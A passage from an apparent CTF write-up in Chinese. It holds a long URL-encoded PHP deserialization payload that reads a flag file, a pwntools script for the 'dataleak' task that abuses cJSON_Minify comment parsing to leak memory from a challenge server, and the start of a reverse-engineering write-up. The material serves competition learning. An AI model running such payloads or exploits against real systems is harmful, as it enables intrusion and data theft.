style="color:#ae81ff">22</span><span style="color:#a6e22e">UOvWbl</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A21</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CT6Y5QYS</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">p9mwE7l</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A21</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CRonyv7u</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">uDQ0ehd4p</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A23</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">Cd9vgRnlEA</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">T4rUU9R</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CXl5V1fEbzD</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">fgVgm4TV97</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A23</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CxEFW8yw08</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">nYuAuh2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CUgh4SYk00D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">tQF7ER</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A23</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CAN9pNsmlT</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Ipz7D3</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">uqkULP0XD</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">aysl2yR5g</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">m4pnFndZoX</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">TEODq2c3Uo</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Q7mg44bg</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">UO4yLd</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">rHYG3Wr</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">sPEbogX4</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">yKwNrpRAQ</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">XEH9BQ</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Vkyud3</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">S839pvNRU</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">stdClass</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span>
</code></pre></div><p>然后调用的参数：9ADRPhlSX1UYKREV
即可读到 <code>/fumo</code></p>
<h2 id="pwn">Pwn</h2>
<h3 id="dataleak">dataleak</h3>
<p>核心是调用了 <code>cJSON_Minify</code> 这个函数，这个函数差不多就是省略调所有的注释，读给的 libc 的源码可以发现，<code>/*</code> 在判断 <code>\x00</code> 后仍然有 <code>+=2</code> 这个操作于是可以弥补调读入 <code>0xe</code> 剩下的两个空字节，然后可以分段泄露出data</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys
context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
<span style="color:#66d9ef">else</span>:
    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>

<span style="color:#66d9ef">if</span> debug:
    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./cJSON_PWN&#34;</span>)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.23.so&#34;</span>)
<span style="color:#66d9ef">else</span>:
	p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;124.70.202.226&#34;</span>, <span style="color:#ae81ff">2101</span>)

    
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debugf</span>(b<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
    <span style="color:#66d9ef">if</span> debug:
        <span style="color:#66d9ef">if</span> b:
            gdb<span style="color:#f92672">.</span>attach(p,<span style="color:#e6db74">&#34;b *$rebase(</span><span style="color:#e6db74">{b}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">=</span> hex(b)))
        <span style="color:#66d9ef">else</span>:
            gdb<span style="color:#f92672">.</span>attach(p)
            
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./cJSON_PWN&#39;</span>)



ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)

debugf(<span style="color:#ae81ff">0x120D</span>)

<span style="color:#75715e"># sn(b&#34;a&#34;*14)</span>
<span style="color:#75715e"># sn(p64(elf.got[&#34;read&#34;]))</span>

sn(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaaaaaaaaa/*a&#34;</span>)
sn(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaaa/*&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>)

sn(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaaa/*&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>)
sn(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/*&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span>)


p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="re">Re</h2>
<h3 id="godness-dance">godness dance</h3>
<p>输入长度 28</p>
<p>上来是个哈希表做字母频率统计，<code>i</code> 和 <code>u</code> 出现两次，其余 <code>a-z</code> 出现一次</p>
<p>然后将 <code>0-28</code> 依次放到一个数组里，看了一下密文，发现也是 <code>0-28</code></p>
